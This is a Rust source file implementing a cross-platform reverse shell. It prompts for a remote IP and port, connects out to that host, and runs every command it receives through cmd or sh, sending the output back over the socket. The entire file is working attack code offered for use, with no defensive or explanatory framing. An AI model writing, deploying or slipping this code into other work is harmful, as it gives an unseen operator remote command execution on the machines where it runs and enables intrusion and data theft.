use std::net::{TcpStream, SocketAddr, IpAddr};
use std::process::{Command, Stdio};
use std::io::{self, Write, Read};

fn main() {

    // Prompt for user input
    println!("Enter the remote host to recieve the connection :");

    // Flush stdout to show prompt before input
    io::stdout().flush().unwrap();

    // Read from stdin
    let mut rhost = String::new();
    std::io::stdin().read_line(&mut rhost).expect("[*] Failed to read ip address");

    // Trim the newline character
    let rhost = rhost.trim();
    
    // Parse the input into IpAddr
    match rhost.parse::<IpAddr>() {
        Ok(ip) => println!("[*] The IP address you entered is: {}", ip),
        Err(_) => println!("[*] Invalid IP address entered."),
    }
    
    // Prompt for user input
    println!("Enter the remote port to recieve the connection :");

    // Flush stdout to show prompt before input
    io::stdout().flush().unwrap();

    // Read from stdin
    let mut rport = String::new();
    std::io::stdin().read_line(&mut rport).expect("[*] Failed to read port");

    let rport = rport.trim();

    // Validate port is valid
    match rport.parse::<u16>() {
        Ok(port) => {
            // If port valid print port
            println!("[*] The port number you entered is valid: {}", port);
        }
        Err(_) => {
            // Invalid port number 
            println!("[*] Invalid port number, Port must be between 0 and 65535.");
        }
    }
  
    // format IP:PORT as socket_details
    let socket_details = format!("{rhost}:{rport}");
   
    let r_socket: SocketAddr = (socket_details)
        .parse()
        .expect("Unable to parse socket address");
    
    // Attempt to establish a TCP connection to the remote server
    match TcpStream::connect(r_socket) {
        Ok(mut stream) => {
            // If connection is successful, print message
            println!("[*] Connected to {}!", socket_details);

            loop {
                // Buffer to hold data from the remote server
                let mut buffer = [0; 1024];

                // Read data from the remote server
                match stream.read(&mut buffer) {
                    Ok(bytes_read) if bytes_read > 0 => {
                        // Convert the buffer to a string, trimming any extra characters
                        let command = String::from_utf8_lossy(&buffer[..bytes_read]);

                        // Execute the command received from the server
                        let output = if cfg!(target_os = "windows") {
                            Command::new("cmd")
                                .arg("/C")
                                .arg(&*command)
                                .output()
                        } else {
                            Command::new("sh")
                                .arg("-c")
                                .arg(&*command)
                                .output()
                        };

                        // If the command executes successfully, send the result back to the server
                        match output {
                            Ok(output) => {
                                // Send stdout
                                if !output.stdout.is_empty() {
                                    stream.write_all(&output.stdout).unwrap();
                                }

                                // Send stderr
                                if !output.stderr.is_empty() {
                                    stream.write_all(&output.stderr).unwrap();
                                }
                            }
                            Err(e) => {
                                // If there's an error executing the command, send the error back
                                let error_message = format!("Failed to execute command: {}\n", e);
                                stream.write_all(error_message.as_bytes()).unwrap();
                            }
                        }
                    }
                    Err(e) => {
                        println!("Failed to receive data: {}", e);
                        break;
                    }
                    _ => break,  // Close the loop if the connection is closed
                }
            }
        }
        Err(e) => {
            // If connection fails, print the error
            println!("Failed to connect: {}", e);
        }
    }
}
